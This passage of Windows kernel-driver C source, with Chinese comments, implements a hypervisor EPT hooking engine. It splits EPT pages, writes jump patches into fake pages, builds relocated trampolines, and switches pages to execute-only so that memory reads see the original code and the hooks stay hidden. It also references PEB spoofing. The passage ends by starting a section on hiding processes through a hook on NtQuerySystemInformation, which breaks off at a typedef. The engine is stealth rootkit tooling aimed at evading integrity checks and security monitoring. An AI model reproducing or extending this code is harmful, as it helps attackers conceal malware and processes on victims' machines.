    for (ULONG cpuIndex = 0; cpuIndex < processorCount; ++cpuIndex) {
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        PEPT_TABLES eptTables;
        PEPT_PDE pde;
        PEPT_ENTRY ptTable = NULL;

        if (!vcpuData->IsVirtualized || !vcpuData->EptPebSpoof) {
            continue;
        }
        ++overlayCount;
        eptTables = vcpuData->EptPebSpoof;
        pde = &eptTables->Pd[pdptIndex][pdIndex];
        if (!(pde->Read || pde->Write || pde->Execute)) continue;

        if (pde->Value & (1ULL << 7)) {
            EPT_PDE newPde;
            ULONG64 ptPhysical;

            ptTable = EptSplit2MBPage(
                eptTables,
                (PEPT_ENTRY)pde,
                PhysicalAddress & ~0x1FFFFFULL);
            if (!ptTable) continue;
            ptPhysical = MmGetPhysicalAddress(ptTable).QuadPart;
            newPde.Value = 0;
            newPde.Read = 1;
            newPde.Write = 1;
            newPde.Execute = 1;
            newPde.PageFrameNumber = ptPhysical >> PAGE_SHIFT;
            InterlockedExchange64(
                (volatile LONG64*)&pde->Value,
                (LONG64)newPde.Value);
        } else {
            ptTable = (PEPT_ENTRY)HvEptFindSplitPt(
                eptTables,
                (ULONG64)pde->PageFrameNumber);
            if (!ptTable) continue;
        }

        Page->OverlayTargetPte[cpuIndex] =
            (PEPT_PTE_ENTRY)&ptTable[ptIndex];
        ++successCount;
    }

    Page->OverlayTargetPteCount = processorCount;
    if (successCount != overlayCount) {
        DbgPrint("[EPT-Hook] overlay PTE setup only %u/%u for PA 0x%llx\n",
                 successCount,
                 overlayCount,
                 PhysicalAddress);
        return FALSE;
    }
    EptIncrementVersion();
    return TRUE;
}

// P1-3 旧接口 EptGetOrCreatePteForHook 已废弃,由 EptSetupPerCpuPtesForHook 替代

/*
 * 安全地修改 EPT 页权限
 * 支持直接使用 VcpuData 结构或动态遍历
 */
NTSTATUS
EptModifyPagePermissions(
    _In_ ULONG64 PhysicalAddress,
    _In_ ULONG64 NewPermissions
)
{
    PEPT_PTE_ENTRY pte;
    
    // 首先尝试使用已知的 EPT 结构（使用 2MB 大页）
    if (g_HypervisorContext.IsActive && g_HypervisorContext.VcpuData) {
        ULONG cpuIndex = KeGetCurrentProcessorNumber();
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        
        if (vcpuData->EptTables) {
            PEPT_TABLES eptTables = vcpuData->EptTables;
            ULONG64 pml4Index = (PhysicalAddress >> 39) & 0x1FF;
            ULONG64 pdptIndex = (PhysicalAddress >> 30) & 0x1FF;
            ULONG64 pdIndex = (PhysicalAddress >> 21) & 0x1FF;
            
            // 检查索引是否在我们映射的范围内（前 512GB）
            if (pml4Index == 0 && pdptIndex < 512) {
                PEPT_PML4E pml4e = &eptTables->Pml4[pml4Index];
                if (pml4e->Read || pml4e->Write || pml4e->Execute) {
                    PEPT_PDPTE pdpte = &eptTables->Pdpt[pdptIndex];
                    if (pdpte->Read || pdpte->Write || pdpte->Execute) {
                        PEPT_PDE pde = &eptTables->Pd[pdptIndex][pdIndex];
                        if (pde->Read || pde->Write || pde->Execute) {
                            // 注意：当前使用 2MB 大页，修改会影响整个 2MB 区域
                            // 如果需要 4KB 粒度，需要先分割大页
                            if (KeGetCurrentIrql() <= DISPATCH_LEVEL) {
                                DbgPrint("[EPT-Hook] Warning: Using 2MB large page, affects entire 2MB region\n");
                            }
                            
                            // 直接修改 PDE（2MB 大页）
                            pde->Read = (NewPermissions & EPT_READ) ? 1 : 0;
                            pde->Write = (NewPermissions & EPT_WRITE) ? 1 : 0;
                            pde->Execute = (NewPermissions & EPT_EXECUTE) ? 1 : 0;
                            
                            // 刷新 EPT TLB
                            EptInveptAllContexts();
                            
                            if (KeGetCurrentIrql() <= DISPATCH_LEVEL) {
                                DbgPrint("[EPT-Hook] Modified permissions (2MB page) for PA 0x%llx: R=%d W=%d X=%d\n",
                                    PhysicalAddress, pde->Read, pde->Write, pde->Execute);
                            }
                            
                            return STATUS_SUCCESS;
                        }
                    }
                }
            }
        }
    }
    
    // 回退到动态检测
    pte = EptGetPteForPhysicalAddress(PhysicalAddress);
    if (!pte) {
        if (KeGetCurrentIrql() <= DISPATCH_LEVEL) {
            DbgPrint("[EPT-Hook] Failed to get PTE for PA 0x%llx\n", PhysicalAddress);
        }
        return STATUS_NOT_FOUND;
    }
    
    // 修改权限
    pte->Read = (NewPermissions & EPT_READ) ? 1 : 0;
    pte->Write = (NewPermissions & EPT_WRITE) ? 1 : 0;
    pte->Execute = (NewPermissions & EPT_EXECUTE) ? 1 : 0;
    
    // 刷新 EPT TLB
    EptInveptAllContexts();
    
    DbgPrint("[EPT-Hook] Modified permissions (dynamic) for PA 0x%llx: R=%d W=%d X=%d\n",
        PhysicalAddress, pte->Read, pte->Write, pte->Execute);
    
    return STATUS_SUCCESS;
}

NTSTATUS
EptRemapPage(
    _In_ ULONG64 OriginalPhysical,
    _In_ ULONG64 NewPhysical,
    _In_ ULONG64 Permissions
)
{
    PEPT_PTE_ENTRY pte;
    
    pte = EptGetPteForPhysicalAddress(OriginalPhysical);
    if (!pte) {
        return STATUS_NOT_FOUND;
    }
    
    // 修改物理地址映射
    pte->PhysicalAddress = NewPhysical >> 12;
    pte->Read = (Permissions & EPT_READ) ? 1 : 0;
    pte->Write = (Permissions & EPT_WRITE) ? 1 : 0;
    pte->Execute = (Permissions & EPT_EXECUTE) ? 1 : 0;
    
    // 刷新 EPT TLB
    EptInveptAllContexts();
    
    return STATUS_SUCCESS;
}

// ============================================================
// 辅助函数
// ============================================================

PEPT_HOOK_ENTRY
EptHookFindByPhysicalAddress(
    _In_ ULONG64 PhysicalAddress
)
{
    PLIST_ENTRY entry;
    PEPT_HOOK_ENTRY hookEntry;
    ULONG64 pagePhysical = PhysicalAddress & PAGE_MASK;
    KIRQL oldIrql;
    
    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    
    for (entry = g_EptHookManager.HookList.Flink;
         entry != &g_EptHookManager.HookList;
         entry = entry->Flink)
    {
        hookEntry = CONTAINING_RECORD(entry, EPT_HOOK_ENTRY, ListEntry);
        // 检查原始页地址 AND 伪造页地址
        // Execute-Only 模式下 EPT 指向 FakePage，所以 GPA 是 FakePage 的地址
        if (hookEntry->PageOwner &&
            (hookEntry->PageOwner->TargetPhysicalAddress == pagePhysical ||
             hookEntry->PageOwner->FakePagePhysical == pagePhysical)) {
            KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
            return hookEntry;
        }
    }
    
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
    return NULL;
}

BOOLEAN
EptHookRootOwnsPhysicalPage(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress)
{
    ULONG epoch;
    PEPT_HOOK_PAGE page;
    BOOLEAN owned = FALSE;

    if (!VcpuData || VcpuData->ProcessorNumber >= 64 ||
        !EptHookpAcquireRootEpoch(&epoch)) {
        return FALSE;
    }
    page = EptHookFindPageByPhysicalAddressNoLock(PhysicalAddress);
    if (page && page->State == EptHookStateActive) {
        owned = TRUE;
    }
    EptHookpReleaseRootEpoch(epoch);
    return owned;
}

static PEPT_HOOK_PAGE
EptHookFindPageByPhysicalAddressNoLock(
    _In_ ULONG64 PhysicalAddress
)
{
    PLIST_ENTRY entry;
    PEPT_HOOK_PAGE page;
    ULONG64 pagePhysical = PhysicalAddress & PAGE_MASK;
    
    // 无锁遍历（用于高 IRQL VM Exit 路径）
    for (entry = g_EptHookManager.PageList.Flink;
         entry != &g_EptHookManager.PageList;
         entry = entry->Flink)
    {
        page = CONTAINING_RECORD(entry, EPT_HOOK_PAGE, ListEntry);
        // 检查原始页地址 AND 伪造页地址
        if (page->TargetPhysicalAddress == pagePhysical ||
            page->FakePagePhysical == pagePhysical) {
            return page;
        }
    }
    
    return NULL;
}

PEPT_HOOK_ENTRY
EptHookFindByVirtualAddress(
    _In_ PVOID VirtualAddress
)
{
    PLIST_ENTRY entry;
    PEPT_HOOK_ENTRY hookEntry;
    KIRQL oldIrql;
    
    KeAcquireSpinLock(&g_EptHookManager.Lock, &oldIrql);
    
    for (entry = g_EptHookManager.HookList.Flink;
         entry != &g_EptHookManager.HookList;
         entry = entry->Flink)
    {
        hookEntry = CONTAINING_RECORD(entry, EPT_HOOK_ENTRY, ListEntry);
        if (hookEntry->TargetVirtualAddress == VirtualAddress) {
            KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
            return hookEntry;
        }
    }
    
    KeReleaseSpinLock(&g_EptHookManager.Lock, oldIrql);
    return NULL;
}

PVOID
EptHookGetTrampoline(
    _In_ PEPT_HOOK_ENTRY HookEntry
)
{
    if (!HookEntry) {
        return NULL;
    }
    return HookEntry->TrampolineAddress;
}

// ============================================================
// 内部函数实现
// ============================================================

/*
 * 将物理地址映射到虚拟地址（用于访问 EPT 页表）
 */
static PVOID
EptMapPhysicalToVirtual(
    _In_ ULONG64 PhysicalAddress
)
{
    PHYSICAL_ADDRESS pa;
    pa.QuadPart = PhysicalAddress;
    
    // 使用 MmMapIoSpace 映射物理地址
    // 注意：这只映射一页，如果需要跨页访问需要额外处理
    return MmMapIoSpace(pa, PAGE_SIZE_4KB, MmNonCached);
}

/*
 * 取消物理地址映射
 */
static VOID
EptUnmapPhysical(
    _In_ PVOID VirtualAddress
)
{
    if (VirtualAddress) {
        MmUnmapIoSpace(VirtualAddress, PAGE_SIZE_4KB);
    }
}

/*
 * 从 VMCS 读取 EPTP
 * 
 * 警告：此函数使用 __vmx_vmread，只能在 VMX root 模式下调用（如 VM Exit Handler 内）
 *       在 VMX 模式外调用会导致非法指令异常
 */
static ULONG64
EptGetCurrentEptp(VOID)
{
    SIZE_T eptp = 0;
    
    // 读取 VMCS 中的 EPTP
    // 注意：必须在 VMX root 模式下调用（例如在 VM Exit Handler 内）
    // 尝试使用 __try/__except 保护
    __try {
        if (__vmx_vmread(VMCS_CTRL_EPTP, &eptp) != 0) {
            return 0;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        // 不在 VMX root 模式，返回 0
        return 0;
    }
    
    return eptp;
}

/*
 * 获取 PML4 表的物理地址（从 EPTP 提取）
 */
static ULONG64
EptGetPml4PhysicalFromEptp(
    _In_ ULONG64 Eptp
)
{
    // EPTP 结构：
    // [2:0]   = Memory Type (应该是 6 = Write-Back)
    // [5:3]   = Page Walk Length - 1 (应该是 3，表示 4 级页表)
    // [6]     = Access/Dirty Flags Enable
    // [11:7]  = Reserved
    // [51:12] = PML4 物理地址
    return Eptp & 0xFFFFFFFFF000ULL;
}

/*
 * 自动检测并获取指定物理地址的 EPT PTE
 * 
 * 通过从 VMCS 读取 EPTP，然后遍历 EPT 页表结构
 * 支持 4KB、2MB、1GB 页
 * 
 * @param PhysicalAddress  要查找的物理地址
 * @return 指向 EPT PTE 的指针，如果找不到返回 NULL
 */
PEPT_PTE_ENTRY
EptGetPteForPhysicalAddress(
    _In_ ULONG64 PhysicalAddress
)
{
    ULONG64 eptp;
    ULONG64 pml4PhysAddr;
    PEPT_ENTRY pml4Table = NULL;
    PEPT_ENTRY pdptTable = NULL;
    PEPT_ENTRY pdTable = NULL;
    PEPT_ENTRY ptTable = NULL;
    PEPT_ENTRY pml4e, pdpte, pde, pte;
    ULONG64 pml4Index, pdptIndex, pdIndex, ptIndex;
    PEPT_PTE_ENTRY result = NULL;
    
    // 计算各级索引
    // 物理地址结构（4KB 页）：
    // [47:39] PML4 索引 (9 位)
    // [38:30] PDPT 索引 (9 位)
    // [29:21] PD 索引 (9 位)
    // [20:12] PT 索引 (9 位)
    // [11:0]  页内偏移 (12 位)
    
    pml4Index = (PhysicalAddress >> 39) & 0x1FF;
    pdptIndex = (PhysicalAddress >> 30) & 0x1FF;
    pdIndex = (PhysicalAddress >> 21) & 0x1FF;
    ptIndex = (PhysicalAddress >> 12) & 0x1FF;
    
    DbgPrint("[EPT-Hook] Looking up PA 0x%llx (PML4=%llu, PDPT=%llu, PD=%llu, PT=%llu)\n",
        PhysicalAddress, pml4Index, pdptIndex, pdIndex, ptIndex);
    
    // 方法1：尝试使用 VcpuData 中的 EPT 表（使用 2MB 大页）
    if (g_HypervisorContext.IsActive && g_HypervisorContext.VcpuData) {
        ULONG cpuIndex = KeGetCurrentProcessorNumber();
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        
        if (vcpuData->EptTables) {
            PEPT_TABLES eptTables = vcpuData->EptTables;
            
            // 检查索引是否在映射范围内（前 512GB）
            if (pml4Index == 0 && pdptIndex < 512) {
                PEPT_PML4E pml4eKnown = &eptTables->Pml4[pml4Index];
                if (pml4eKnown->Read || pml4eKnown->Write || pml4eKnown->Execute) {
                    PEPT_PDPTE pdpteKnown = &eptTables->Pdpt[pdptIndex];
                    if (pdpteKnown->Read || pdpteKnown->Write || pdpteKnown->Execute) {
                        PEPT_PDE pdeKnown = &eptTables->Pd[pdptIndex][pdIndex];
                        if (pdeKnown->Read || pdeKnown->Write || pdeKnown->Execute) {
                            // 注意：当前使用 2MB 大页，返回 PDE 而不是 PTE
                            // PDE 和 PTE 的结构类似，可以用相同的类型处理
                            DbgPrint("[EPT-Hook] Found PDE (2MB page) via known structure at %p\n", pdeKnown);
                            return (PEPT_PTE_ENTRY)pdeKnown;
                        }
                    }
                }
            }
        }
    }
    
    // 方法2：从 VMCS 读取 EPTP 并动态遍历
    eptp = EptGetCurrentEptp();
    if (eptp == 0) {
        DbgPrint("[EPT-Hook] No EPTP available\n");
        return NULL;
    }
    
    pml4PhysAddr = EptGetPml4PhysicalFromEptp(eptp);
    DbgPrint("[EPT-Hook] EPTP=0x%llx, PML4 PA=0x%llx\n", eptp, pml4PhysAddr);
    
    // 映射 PML4 表
    pml4Table = (PEPT_ENTRY)EptMapPhysicalToVirtual(pml4PhysAddr);
    if (!pml4Table) {
        DbgPrint("[EPT-Hook] Failed to map PML4 table\n");
        goto cleanup;
    }
    
    // 读取 PML4 条目
    pml4e = &pml4Table[pml4Index];
    DbgPrint("[EPT-Hook] PML4E[%llu] = 0x%llx (R=%d W=%d X=%d)\n",
        pml4Index, pml4e->Value, pml4e->Read, pml4e->Write, pml4e->Execute);
    
    if (!pml4e->Read && !pml4e->Write && !pml4e->Execute) {
        DbgPrint("[EPT-Hook] PML4E not present\n");
        goto cleanup;
    }
    
    // 映射 PDPT 表
    pdptTable = (PEPT_ENTRY)EptMapPhysicalToVirtual(pml4e->PhysicalPageNumber << 12);
    if (!pdptTable) {
        DbgPrint("[EPT-Hook] Failed to map PDPT table\n");
        goto cleanup;
    }
    
    // 读取 PDPT 条目
    pdpte = &pdptTable[pdptIndex];
    DbgPrint("[EPT-Hook] PDPTE[%llu] = 0x%llx (R=%d W=%d X=%d Large=%d)\n",
        pdptIndex, pdpte->Value, pdpte->Read, pdpte->Write, pdpte->Execute, pdpte->LargePage);
    
    if (!pdpte->Read && !pdpte->Write && !pdpte->Execute) {
        DbgPrint("[EPT-Hook] PDPTE not present\n");
        goto cleanup;
    }
    
    // 检查是否是 1GB 大页
    if (pdpte->LargePage) {
        DbgPrint("[EPT-Hook] 1GB large page detected - cannot modify PTE directly\n");
        // 对于大页，返回 PDPTE 本身作为"PTE"
        // 注意：修改大页权限需要不同的处理逻辑
        result = (PEPT_PTE_ENTRY)pdpte;
        goto cleanup;
    }
    
    // 映射 PD 表
    pdTable = (PEPT_ENTRY)EptMapPhysicalToVirtual(pdpte->PhysicalPageNumber << 12);
    if (!pdTable) {
        DbgPrint("[EPT-Hook] Failed to map PD table\n");
        goto cleanup;
    }
    
    // 读取 PD 条目
    pde = &pdTable[pdIndex];
    DbgPrint("[EPT-Hook] PDE[%llu] = 0x%llx (R=%d W=%d X=%d Large=%d)\n",
        pdIndex, pde->Value, pde->Read, pde->Write, pde->Execute, pde->LargePage);
    
    if (!pde->Read && !pde->Write && !pde->Execute) {
        DbgPrint("[EPT-Hook] PDE not present\n");
        goto cleanup;
    }
    
    // 检查是否是 2MB 大页
    if (pde->LargePage) {
        DbgPrint("[EPT-Hook] 2MB large page detected - cannot modify PTE directly\n");
        // 对于大页，返回 PDE 本身作为"PTE"
        result = (PEPT_PTE_ENTRY)pde;
        goto cleanup;
    }
    
    // 映射 PT 表
    ptTable = (PEPT_ENTRY)EptMapPhysicalToVirtual(pde->PhysicalPageNumber << 12);
    if (!ptTable) {
        DbgPrint("[EPT-Hook] Failed to map PT table\n");
        goto cleanup;
    }
    
    // 读取 PT 条目
    pte = &ptTable[ptIndex];
    DbgPrint("[EPT-Hook] PTE[%llu] = 0x%llx (R=%d W=%d X=%d)\n",
        ptIndex, pte->Value, pte->Read, pte->Write, pte->Execute);
    
    if (!pte->Read && !pte->Write && !pte->Execute) {
        DbgPrint("[EPT-Hook] PTE not present\n");
        goto cleanup;
    }
    
    // 成功找到 PTE
    // 注意：这里返回的是映射后的虚拟地址，调用者需要注意
    // 对于持久修改，可能需要不同的策略
    result = (PEPT_PTE_ENTRY)pte;
    
    DbgPrint("[EPT-Hook] Successfully found PTE at %p for PA 0x%llx\n", result, PhysicalAddress);
    
cleanup:
    // 注意：这里不能立即释放映射，因为我们返回的是映射地址
    // 实际使用中需要更复杂的生命周期管理
    // 或者在调用者使用完后手动调用 unmap
    
    // 暂时保持映射，由调用者负责
    // 更好的实现是复制 PTE 值而不是返回指针
    
    return result;
}

/*
 * 创建伪造页（包含 Hook 代码）
 */
static NTSTATUS
EptCreateFakePage(
    _In_ PEPT_HOOK_ENTRY HookEntry
)
{
    PHYSICAL_ADDRESS maxAddr;
    PUCHAR targetPage;
    PUCHAR hookCode;
    
    maxAddr.QuadPart = -1LL;
    
    // 分配伪造页
    HookEntry->FakePageVirtual = MmAllocateContiguousMemory(PAGE_SIZE_4KB, maxAddr);
    if (!HookEntry->FakePageVirtual) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    HookEntry->FakePagePhysical = 
        MmGetPhysicalAddress(HookEntry->FakePageVirtual).QuadPart;
    
    // 复制原始页内容
    targetPage = (PUCHAR)((ULONG_PTR)HookEntry->TargetVirtualAddress & PAGE_MASK);
    RtlCopyMemory(HookEntry->FakePageVirtual, targetPage, PAGE_SIZE_4KB);
    
    // 在伪造页中写入 Hook 代码（跳转到 HookFunction）
    hookCode = (PUCHAR)HookEntry->FakePageVirtual + HookEntry->OffsetInPage;
    
    /* Prepare built the complete 14-byte site patch before allocating the
     * owner.  Copy it as bytes; never expose a half-written absolute jump. */
    RtlCopyMemory(
        hookCode,
        HookEntry->PatchBytes,
        EPT_HOOK_PATCH_SIZE);
    
    DbgPrint("[EPT-Hook] Created fake page: VA=%p PA=0x%llx\n",
        HookEntry->FakePageVirtual, HookEntry->FakePagePhysical);
    DbgPrint("[EPT-Hook] FakePage JMP at offset 0x%x -> Hook at %p\n",
        HookEntry->OffsetInPage, HookEntry->HookFunction);
    DbgPrint("[EPT-Hook] JMP bytes: %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X %02X\n",
        hookCode[0], hookCode[1], hookCode[2], hookCode[3], hookCode[4], hookCode[5],
        hookCode[6], hookCode[7], hookCode[8], hookCode[9], hookCode[10], hookCode[11],
        hookCode[12], hookCode[13]);
    
    return STATUS_SUCCESS;
}

/*
 * 创建跳板（用于调用原函数）
 *
 * 2026-06-16 方案 A 改写: 委派给共享重写器 HvHookRewriteTrampoline。
 *   - 旧 RelocateRelativeInstructions 整个删除(只能 in-place 同长度修 rel32, 短跳无能为力)。
 *   - 短跳 EB/70-7F 现在被扩成 rel32 长跳, 后续指令偏移整体重算, 范围内 rel32 目标重指。
 *   - RIP-relative disp32 按新 RIP 重新计算。
 *   - LOOPxx/JECXZ + 解码失败 + 距离超 ±2GB → 拒装(返回 NTSTATUS, 调用方 free entry)。
 *
 * 跳板结构(同前):
 *   [重写后指令字节, 长度 = HookEntry->TrampolineWriteLength]
 *   [JMP [RIP+0]; 绝对地址 = TargetVA + OriginalBytesLength]
 */
static NTSTATUS
EptCreateTrampoline(
    _In_ PEPT_HOOK_ENTRY HookEntry
)
{
    UCHAR scratch[128];                  // 上限 = 16 条 * 6B + 14B jmp-back = 110, 取 128 留余
    HV_TRAMP_REWRITE_RESULT rr;
    PUCHAR trampoline;
    ULONG worstCase;
    ULONG worstAligned;
    ULONG actualSize;
    ULONG actualAligned;
#if !EPT_HOOK_SIMPLE_MODE
    NTSTATUS st;
#endif

    // ---- 阶段 A: 保守上界预约池空间, 但不 commit ----
    // 短跳最大扩成 rel32 是 2→6 (Jcc), 所以 *3 上界覆盖任何重写;
    // 加 jmp-back 14 字节, 再按 16 字节对齐。
    worstCase    = HookEntry->OriginalBytesLength * 3 + sizeof(JmpTemplate);
    worstAligned = (worstCase + 0x0F) & ~0x0FUL;

    if (g_EptHookManager.TrampolinePoolUsed + worstAligned > PAGE_SIZE_4KB * 4) {
        DbgPrint("[EPT-Hook] Trampoline pool exhausted (need worst-case %u aligned, have %u)\n",
                 worstAligned,
                 PAGE_SIZE_4KB * 4 - g_EptHookManager.TrampolinePoolUsed);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // 预约: 取池指针但 TrampolinePoolUsed 还不动, 失败可归还(让下次装载用同位置)
    trampoline = (PUCHAR)g_EptHookManager.TrampolinePool +
                 g_EptHookManager.TrampolinePoolUsed;

#if EPT_HOOK_SIMPLE_MODE
    // 简单模式: 直接复制 + 14 字节 jmp-back, 不调重写器(短跳问题在此模式下用户接受)
    {
        ULONG i;
        DbgPrint("[EPT-Hook] SIMPLE_MODE: skipping rewriter, direct copy %u bytes\n",
                 HookEntry->OriginalBytesLength);
        RtlCopyMemory(scratch, HookEntry->OriginalBytes, HookEntry->OriginalBytesLength);
        rr.DstLen = HookEntry->OriginalBytesLength;
        rr.InstCount = 0;
        for (i = 0; i < HV_TRAMP_MAX_INSTS; i++) {
            rr.OrigOffsets[i] = 0;
            rr.NewOffsets[i] = 0;
            rr.Types[i] = 0;
        }
    }
#else
    // ---- 完整模式: 走真重写器 ----
    st = HvHookRewriteTrampoline(
        HookEntry->OriginalBytes,
        HookEntry->OriginalBytesLength,
        (ULONG_PTR)HookEntry->TargetVirtualAddress,
        scratch, sizeof(scratch),
        (ULONG_PTR)trampoline,
        &rr);
    if (!NT_SUCCESS(st)) {
        DbgPrint("[EPT-Hook] HvHookRewriteTrampoline failed: 0x%X (srcLen=%u)\n",
                 st, HookEntry->OriginalBytesLength);
        // 池不 commit, TrampolinePoolUsed 不动 → 预约归还
        return st;
    }
#endif

    // ---- 拷到池 + 14 字节 jmp-back ----
    RtlCopyMemory(trampoline, scratch, rr.DstLen);

    // 2026-06-16 已有保护: 本地栈缓冲拼好 14 字节再单次写入, 消除"全 0 占位"中间态。
    {
        UCHAR jmpBuf[sizeof(JmpTemplate)];
        RtlCopyMemory(jmpBuf, JmpTemplate, 6);                  // jmp [rip+0] opcode
        *(PVOID*)(jmpBuf + 6) =
            (PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength;
        RtlCopyMemory(trampoline + rr.DstLen, jmpBuf, sizeof(jmpBuf));
    }

    // ---- 阶段 B: compute tentative use; commit only after self-check ----
    actualSize    = rr.DstLen + sizeof(JmpTemplate);
    actualAligned = (actualSize + 0x0F) & ~0x0FUL;

    // INT3 fill align padding (2026-05-21 防御: gap 里走错的 RIP 触发 #BP 而非随机指令)
    if (actualAligned > actualSize) {
        RtlFillMemory(trampoline + actualSize, actualAligned - actualSize, 0xCC);
    }

    // ---- 完整 trampoline dump + 重写映射打印 ----
    DbgPrint("[EPT-Hook] Trampoline at %p (srcLen=%u dstLen=%u instCount=%u alignedSize=%u):\n",
             trampoline, HookEntry->OriginalBytesLength, rr.DstLen, rr.InstCount, actualAligned);
    {
        ULONG dumpLen = actualAligned + 16;
        if (dumpLen > 80) dumpLen = 80;
        for (ULONG dpi = 0; dpi < dumpLen; dpi += 16) {
            DbgPrint("[EPT-Hook]   +0x%02X: %02X %02X %02X %02X %02X %02X %02X %02X "
                     "%02X %02X %02X %02X %02X %02X %02X %02X\n",
                     dpi,
                     trampoline[dpi+0],  trampoline[dpi+1],  trampoline[dpi+2],  trampoline[dpi+3],
                     trampoline[dpi+4],  trampoline[dpi+5],  trampoline[dpi+6],  trampoline[dpi+7],
                     trampoline[dpi+8],  trampoline[dpi+9],  trampoline[dpi+10], trampoline[dpi+11],
                     trampoline[dpi+12], trampoline[dpi+13], trampoline[dpi+14], trampoline[dpi+15]);
        }
    }

#if !EPT_HOOK_SIMPLE_MODE
    {
        ULONG ri;
        for (ri = 0; ri < rr.InstCount; ri++) {
            DbgPrint("[EPT-Hook]   #%u orig+0x%02X -> new+0x%02X  type=%u\n",
                     ri, rr.OrigOffsets[ri], rr.NewOffsets[ri], rr.Types[ri]);
        }
    }
#endif

    // ---- 自检: 用 HvLdeDecode 逐条解码 trampoline 内容, 累计长度必须 == rr.DstLen ----
    {
        ULONG off = 0;
        ULONG step = 0;
        HV_INST_INFO info;
        BOOLEAN selfCheckOk = TRUE;
        while (off < rr.DstLen && step < HV_TRAMP_MAX_INSTS + 2) {
            if (!HvLdeDecode(trampoline + off, &info) || info.Length == 0) {
                DbgPrint("[EPT-Hook] *** SELF-CHECK FAIL *** decode failure at trampoline+0x%X "
                         "(byte 0x%02X) — trampoline will jump mid-instruction\n",
                         off, trampoline[off]);
                selfCheckOk = FALSE;
                break;
            }
            off += info.Length;
            step++;
        }
        if (selfCheckOk && off != rr.DstLen) {
            DbgPrint("[EPT-Hook] *** SELF-CHECK FAIL *** instruction boundary mismatch: "
                     "decoded=%u expected=%u\n", off, rr.DstLen);
            selfCheckOk = FALSE;
        }
        if (selfCheckOk) {
            // 验证 jmp-back 模板
            if (trampoline[rr.DstLen]     == 0xFF &&
                trampoline[rr.DstLen + 1] == 0x25 &&
                *(PVOID*)(trampoline + rr.DstLen + 6) ==
                    (PVOID)((PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength))
            {
                DbgPrint("[EPT-Hook] Self-check OK: %u instructions over %u bytes, jmp-back -> %p\n",
                         step, off,
                         (PVOID)((PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength));
            } else {
                DbgPrint("[EPT-Hook] *** SELF-CHECK FAIL *** jmp-back template wrong at +0x%X\n", rr.DstLen);
                selfCheckOk = FALSE;
            }
        }
        if (!selfCheckOk) {
            RtlFillMemory(trampoline, actualAligned, 0xCC);
            return STATUS_DATA_ERROR;
        }
    }

    g_EptHookManager.TrampolinePoolUsed += actualAligned;
    HookEntry->TrampolineAddress = trampoline;
    HookEntry->TrampolineWriteLength = rr.DstLen;
    HookEntry->TrampolineInstCount = rr.InstCount;

    DbgPrint("[EPT-Hook]   Jump back to: %p\n",
        (PUCHAR)HookEntry->TargetVirtualAddress + HookEntry->OriginalBytesLength);

    return STATUS_SUCCESS;
}

/*
 * 切换到 FakePage（Execute-Only 模式的稳定状态）
 * 
 * Execute-Only 模式：
 *   - 指向 FakePage（包含 JMP 到 Hook 函数）
 *   - R=0, W=0, X=1 (只可执行)
 *   - 执行时：正常运行 Hook 跳转
 *   - 读取时：触发 Violation -> 临时显示原始代码
 */
static VOID
EptSwitchToFakePage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PEPT_HOOK_PAGE Page,
    _In_ ULONG CpuIndex
)
{
    static volatile LONG switchCount = 0;
    LONG current;
    PEPT_PTE_ENTRY activePte;

    // 安全检查
    if (!Page) {
        return;
    }

    activePte = EptHookpSelectPagePte(Page, VcpuData, CpuIndex);
    if (CpuIndex >= 64 || !activePte) {
        return;
    }

    if (Page->State != EptHookStateActive) {
        return;
    }

    if (Page->FakePagePhysical == 0) {
        return;
    }

    current = InterlockedIncrement(&switchCount);

    // 设置 EPT 指向 FakePage，Execute-Only 权限 (只动当前 CPU 的 PTE)
    EptSetPteAtomic(activePte,
                    Page->FakePagePhysical >> 12, 0, 0, 1);

    // 诊断 — 注意 root mode 不能 DbgPrint
    UNREFERENCED_PARAMETER(current);

    EptInveptAllContexts();
}

/*
 * 切换到原始页（用于回退模式的稳定状态）
 * 
 * 警告：此函数设置 X=0，如果 Guest RIP 在同一页面上会导致 Execute Violation！
 *       对于 Execute-Only 模式的 Read Violation 处理，应该直接在
 *       EptHookHandleViolation 中设置权限，而不是调用此函数。
 * 
 * 回退模式：这是初始/稳定状态
 *   - 指向原始页
 *   - R=1, W=1, X=0 (可读写不可执行)
 *   - 读取时正常返回原始代码，执行时触发 Violation
 */
static VOID
EptSwitchToOriginalPage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PEPT_HOOK_PAGE Page,
    _In_ ULONG CpuIndex
)
{
    PEPT_PTE_ENTRY activePte;

    // 安全检查
    if (!Page) {
        return;
    }

    activePte = EptHookpSelectPagePte(Page, VcpuData, CpuIndex);
    if (CpuIndex >= 64 || !activePte) {
        return;
    }

    // 验证 Hook 状态
    if (Page->State != EptHookStateActive) {
        return;
    }

    // 验证 TargetPhysicalAddress 有效
    if (Page->TargetPhysicalAddress == 0) {
        return;
    }

    // 恢复 EPT 映射到原始页（原子写：单次 cmpxchg64，避免多核 race 窗口）
    EptSetPteAtomic(activePte,
                    Page->TargetPhysicalAddress >> 12, 1, 1, 0);

    EptInveptAllContexts();
}

// ============================================================
// 高级功能：隐藏进程
// ============================================================

/*
 * 隐藏进程示例
 * 原理：Hook NtQuerySystemInformation，过滤 SystemProcessInformation
 */

// 原始函数类型
typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

// ZwQuerySystemInformation 声明（用于枚举进程）
